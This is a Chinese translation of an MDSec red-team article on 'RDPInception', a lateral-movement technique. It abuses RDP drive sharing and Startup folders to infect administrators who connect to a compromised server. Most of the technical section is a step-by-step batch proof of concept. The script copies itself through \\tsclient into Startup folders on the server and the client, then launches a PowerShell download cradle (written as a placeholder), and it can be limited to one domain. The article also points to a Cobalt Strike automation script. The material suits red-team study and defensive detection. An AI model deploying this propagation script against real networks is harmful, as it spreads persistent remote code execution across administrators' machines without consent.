> 原文链接: https://www.anquanke.com//post/id/86365 


# 【技术分享】RDPInception：另类RDP攻击手段（附演示视频）


                                阅读量   
                                **110225**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2017/06/rdpinception/](https://www.mdsec.co.uk/2017/06/rdpinception/)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p2.ssl.qhimg.com/t0111084d377023e118.jpg)](https://p2.ssl.qhimg.com/t0111084d377023e118.jpg)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：140RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、前言**



系统管理员经常使用远程桌面（Remote Desktop）来远程管理计算机。对许多机构及组织来说，这种行为意味着被远程访问的主机需要被放在DMZ区中或者只开放TCP 3389端口的隔离网络中。

在远程桌面中，用户可以“选择要在远程会话中使用的设备和资源”，这些设备或资源包括本地磁盘共享等，如下图所示：

[![](https://p2.ssl.qhimg.com/t015b623a735a767d56.png)](https://p2.ssl.qhimg.com/t015b623a735a767d56.png)

已经有许多研究人员对远程桌面的攻击路径以及存在的安全风险进行了理论上的分析，其中经常被提及的一个安全风险就是接受远程桌面连接请求的目标服务器可以对连入的主机发起攻击。[ActiveBreach](https://www.mdsec.co.uk/services/red-teaming/)团队的[Vincent Yiu](https://www.twitter.com/vysecurity)对这种名为RDPInception的攻击做了分析，提供了概念验证（PoC，proof of concept）脚本，利用这个脚本可以以递归方式对RDP服务器的访客发起攻击。ActiveBreach团队在模拟对抗演练中多次利用到了这种技术，取得了非常不错的效果。

<br>

**二、RDPInception攻击的相关概念**



RDPInception的攻击原理基于一个非常简单的概念，那就是“启动（Startup）”程序，也就是说，利用开始菜单中的“启动”目录强迫用户在登陆时执行代码。

考虑以下攻击场景：

[![](https://p0.ssl.qhimg.com/t01ce04834f124478c6.png)](https://p0.ssl.qhimg.com/t01ce04834f124478c6.png)

在这个攻击场景中，攻击者已经攻陷了数据库服务器。管理员通过RDP方式连入跳板节点（Jump box），然后再利用RDP方式依次连入域控（Domain Controller）、文件服务器以及数据库服务器。在这条连接路径中，攻击者可以在任意节点中发起RDPInception攻击。从理论上讲，只要管理员下次再次登录每台机器，攻击者就可以利用这种攻击方式获取整条路径中每台服务器的shell接口。在这个场景中，攻击者唯一需要的就是在DB001上发起RDPInception攻击，剩余的程序可以自动完成。

攻击者可以在受限环境中使用这种技术实施横向渗透攻击，无需用户凭证或利用漏洞。

<br>

**三、RDPInception的适用场景**



这种攻击技术最适合在高度受限的环境中使用，特别是当其他横向渗透技术以及权限提升技术无法完成任务时，攻击者就可以考虑使用这种方法。

此外，我们来考虑一种攻击场景，其中公司的某位员工在早上4点时通过远程方式登录服务器，整个登录会话持续了5分钟。在这种情况下，即使黑客能够持续不断地监视连入的RDP会话，也很难在这么短的时间内部署攻击环境。此外，这种监视动作很大，因为攻击者需要定期使用“query user”命令来判断当前主机是否有RDP连入会话，如果攻击者每隔1小时查询一次RDP会话，那么在这种攻击场景中，攻击者就会错过良机。RDPInception技术完全不需要持续性监视RDP连入会话。

<br>

**四、RDPInception原理**



RDPInception的概念验证程序是一个较为简单的批处理脚本，详细步骤如下所示。

关闭echo功能。



```
@echo off
```

设置一个短期计时器，确保tsclient已被加载。



```
timeout 1 &gt;nul 2&gt;&amp;1
```

在访客主机以及目标主机上创建临时目录。



```
mkdir \tsclientctemp &gt;nul 2&gt;&amp;1
mkdir C:temp &gt;nul 2&gt;&amp;1
```

将批处理脚本拷贝到临时目录中。



```
copy run.bat C:temp &gt;nul 2&gt;&amp;1
copy run.bat \tsclientctemp &gt;nul 2&gt;&amp;1
```

确保%TEMP%目录中不存在某个文本文件。



```
del /q %TEMP%temp_00.txt &gt;nul 2&gt;&amp;1
```

在访客主机以及目标主机上搜索启动目录。



```
set dirs=dir /a:d /b /s C:users*Startup*
set dirs2=dir /a:d /b /s \tsclientcusers*startup*
echo|%dirs%|findstr /i “MicrosoftWindowsStart MenuProgramsStartup”&gt;&gt;”%TEMP%temp_00.txt”
echo|%dirs2%|findstr /i “MicrosoftWindowsStart MenuProgramsStartup”&gt;&gt;”%TEMP%temp_00.txt”
```

遍历这些目录，尝试将批处理脚本传播到这些目录中。



```
for /F “tokens=*” %%a in (%TEMP%temp_00.txt) DO (
copy run.bat “%%a” &gt;nul 2&gt;&amp;1
copy C:temprun.bat “%%a” &gt;nul 2&gt;&amp;1
copy \tsclientctemprun.bat “%%a” &gt;nul 2&gt;&amp;1
)
```

清理%TEMP%文件。



```
del /q %TEMP%temp_00.txt &gt;nul 2&gt;&amp;1
```

使用PowerShell来下载执行攻击程序。



```
powershell.exe &lt;cradle here&gt;
```

<br>

**五、攻击范围<br>**



为了在给定条件下精确筛选攻击目标，攻击者在下载或执行攻击载荷时通常会遵循某些约束条件。

以下环境变量经常作为约束条件使用，比如：

1、用户名

2、用户所在域

3、子网信息

比如，我们可以使用用户所在域对攻击脚本进行修改：



```
If “&lt;DOMAINNAME&gt;“==”%USERDOMAIN%” (&lt;powershell cradle here&gt;)
```



**六、RDPInception工具<br>**



我们上传了一个攻击[脚本](https://github.com/mdsecactivebreach/RDPInception/)，可以依托Cobalt Strike框架自动化完成攻击过程，在这个项目中还有一个批处理脚本，大家可以自行修改以手动实施攻击，或者与其他工具（如Empire）配合使用。

如果你直接运行rdpinception，选择HTTP、HTTPS或者DNS类型的监听器，那么攻击过程就不会受到约束条件限制。

如果你以“rdpinception ACME”方式运行攻击脚本，那么攻击过程的约束条件就是ACME域，攻击脚本只会在加入到ACME域的主机上运行。

演示视频如下：



攻击所需的所有工具都可以从Github上的[ActiveBreach](https://github.com/mdsecactivebreach/RDPInception/)仓库中获取。


